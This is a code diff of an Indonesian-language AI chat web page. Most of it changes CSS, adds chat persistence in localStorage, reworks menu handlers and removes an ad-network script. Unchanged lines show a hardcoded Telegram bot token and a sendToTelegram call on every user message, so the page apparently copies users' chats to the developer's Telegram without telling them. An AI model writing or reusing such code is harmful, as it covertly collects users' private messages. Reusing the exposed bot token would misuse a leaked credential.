@@ -17,7 +17,7 @@
         }
 
         .chat-container {
-            width: 90%; /* Make container responsive */
+            width: 90%;
             max-width: 400px;
             height: 600px;
             background-color: #ffffff;
@@ -25,18 +25,19 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             display: flex;
             flex-direction: column;
+            position: relative; /* Added for menu positioning */
         }
 
         .header {
             background-color: #075E54;
             color: white;
-            padding: 5px; /* Reduced padding */
+            padding: 5px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-top-left-radius: 10px;
             border-top-right-radius: 10px;
-            height: 40px; /* Set a fixed height */
+            height: 40px;
         }
 
         .header .status {
@@ -48,39 +49,42 @@
         .header-content {
             display: flex;
             flex-direction: column;
-            align-items: flex-start; /* Align text to the left */
-            margin-left: 10px; /* Space from the left edge */
+            align-items: flex-start;
+            margin-left: 10px;
         }
 
         .header-content h3 {
             margin: 0;
-            font-size: 16px; /* Adjust font size for better responsiveness */
+            font-size: 16px;
         }
 
         .menu {
             cursor: pointer;
             position: relative;
-            font-size: 24px; /* Increase size of the three dots */
-            margin-right: 10px; /* Space from the right edge */
+            font-size: 24px;
+            margin-right: 10px;
         }
 
         .menu-items {
             display: none;
             position: absolute;
-            top: 30px;
+            top: 40px;
             right: 0;
             background-color: white;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
             border-radius: 5px;
             z-index: 10;
+            min-width: 150px; /* Set a minimum width */
+            padding: 5px 0; /* Add padding for items */
         }
 
         .menu-item {
-            padding: 10px 20px;
+            padding: 8px 15px; /* Adjusted padding */
             cursor: pointer;
             white-space: nowrap;
-            color: #075E54; /* Green color */
-            font-weight: bold; /* Bold text */
+            color: #075E54;
+            font-weight: bold;
+            font-size: 14px; /* Slightly smaller font size */
         }
 
         .menu-item:hover {
@@ -181,14 +185,22 @@
         window.location.href = 'https://amindeveloper99.github.io';
     }
 
-    // Fokus otomatis ke input ketika halaman dibuka
-    window.onload = function() {
-        document.getElementById('userInput').focus();
-    }
-
     const apiUrl = 'https://api.nyxs.pw/ai/gpt4?text=';
     const chatBox = document.getElementById('chat-box');
-    let chatHistory = ""; // Menyimpan riwayat chat
+    let chatHistory = localStorage.getItem('chatHistory') || ""; // Get chat history from localStorage
+
+    // Load chat history on page load
+    window.onload = function() {
+        document.getElementById('userInput').focus();
+        if (chatHistory) {
+            chatHistory.split('\n').forEach(message => {
+                if (message) {
+                    const sender = message.startsWith("Pengguna:") ? 'user' : 'bot';
+                    addMessage(message.replace("Pengguna: ", "").replace("AI: ", ""), sender);
+                }
+            });
+        }
+    }
 
     async function sendToTelegram(message) {
         const token = '7556736179:AAFAzU6EeDMmGa1f7ZyGMlYN4kBHgfSFYYw';
@@ -221,6 +233,7 @@
         if (message) {
             addMessage(message, 'user');
             chatHistory += "Pengguna: " + message + "\n"; // Tambahkan pesan pengguna ke riwayat
+            localStorage.setItem('chatHistory', chatHistory); // Save to localStorage
             sendToTelegram(message); // Kirim pesan ke Telegram
             fetchAIResponse(message);
             userInput.value = '';
@@ -254,6 +267,7 @@
             if (data.status) {
                 addMessage(data.result, 'bot');
                 chatHistory += "AI: " + data.result + "\n"; // Tambahkan balasan AI ke riwayat
+                localStorage.setItem('chatHistory', chatHistory); // Save to localStorage
             } else {
                 addMessage('Maaf, ada kesalahan.', 'bot');
             }
@@ -268,24 +282,17 @@
         return new Date().toLocaleTimeString('id-ID', options);
     }
 
-    // Toggle menu
+    // Toggle menu visibility
     function toggleMenu() {
         const menuItems = document.getElementById('menuItems');
-        menuItems.style.display = menuItems.style.display === 'block' ? 'none' : 'block';
-    }
-
-    // Close menu when clicking outside
-    window.onclick = function(event) {
-        const menuItems = document.getElementById('menuItems');
-        if (!event.target.matches('.menu') && !menuItems.contains(event.target)) {
-            menuItems.style.display = 'none';
-        }
+        menuItems.style.display = menuItems.style.display === 'none' ? 'block' : 'none';
     }
 
     // Clear chat history
     function clearChat() {
         chatBox.innerHTML = '';
         chatHistory = '';
+        localStorage.removeItem('chatHistory'); // Clear from localStorage
         document.getElementById('menuItems').style.display = 'none'; // Close the menu
     }
 
@@ -300,10 +307,15 @@
         window.open('/sawer.png', '_blank');
         document.getElementById('menuItems').style.display = 'none'; // Close the menu
     }
+
+    // Close menu on outside click
+    document.addEventListener('click', (event) => {
+        const menuItems = document.getElementById('menuItems');
+        if (!event.target.matches('.menu') && !menuItems.contains(event.target)) {
+            menuItems.style.display = 'none';
+        }
+    });
 </script>
 
-<script type='text/javascript' src='//pl24503491.cpmrevenuegate.com/28/23/81/282381b2d984b79423e3f1e98d4146c1.js'></script>
-
-<div id="container-e92c237c04558d624f7a60c70e95f3e9"></div>
 </body>
 </html>
